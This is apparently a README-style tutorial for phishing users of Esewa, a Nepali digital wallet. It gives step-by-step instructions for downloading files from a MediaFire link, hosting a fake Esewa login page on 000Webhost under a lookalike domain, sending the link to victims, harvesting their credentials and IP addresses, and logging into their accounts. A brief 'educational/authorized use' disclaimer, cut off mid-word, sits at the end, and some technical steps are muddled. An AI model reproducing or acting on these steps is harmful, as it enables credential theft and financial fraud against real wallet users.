
# Esewa Exploiting: Credential Phishing on 000Webhost (With Script Download)

This guide will walk you through the process of exploiting Esewa, a popular digital wallet in Nepal, using a credential phishing attack. We will be using 000Webhost as our web hosting service and downloading a script to automate the unzipping process.

## Steps

1. Download the repository files and the `unzip.php` file from the provided link https://www.mediafire.com/file/h2vj2fr10hvavze/unzip.php/file
2. Unzip the downloaded repository files.
3. Host the fake login page on 000Webhost. Here are the steps to do this:
    a. Sign up for a free account on 000Webhost.
    b. Log in to your 000Webhost account.
    c. Click on the "My Sites" tab and then click on the "Create Site" button.
    d. Choose a domain name for your phishing site (e.g., "esewa-login.00webhostapp.com").
    e. Select the "Free" hosting plan.
    f. Click on the "Create Site" button to create your new site.
    g. Once your site is created, click on the "Manage Site" button.
    h. Click on the "File Manager" button.

    i. In the File Manager, navigate to the "public_html" directory.
    j. Upload the repository files to the "public_html" directory.
    k. Upload the `unzip.php` file to the "public_html" directory.
    l. Click on the `unzip.php` file and click on "View" to unzip the repository files.
4. Navigate to the unzipped folder, find the `login.html` file, and click on "View" to see the Esewa login page.
5. Copy the link of the login page and send it to your target victim.
6. Once the user enters their credentials on the fake login page, use a tool such as Burp Suite or Wireshark to intercept and capture the credentials.
7. Use the captured credentials to log in to the user's Esewa account and perform whatever actions you have been authorized to perform.
8. After the user enters their credentials, a new file named `data.txt` will be created in the "public_html" directory, containing the victim's IP address. The IP address will also be stored in a separate file named `ip.txt`.

## About Developer Bijaya Tamang



## Conclusion

Credential phishing is a powerful attack that can be used to gain unauthorized access to a user's account. By following the steps outlined in this guide, you can successfully exploit Esewa using this attack. However, it is important to remember that this attack should only be used with the explicit permission and authorization of the target user and Esewa.
## Disclaimer

This guide is intended for educational purposes only and should not be used for mal
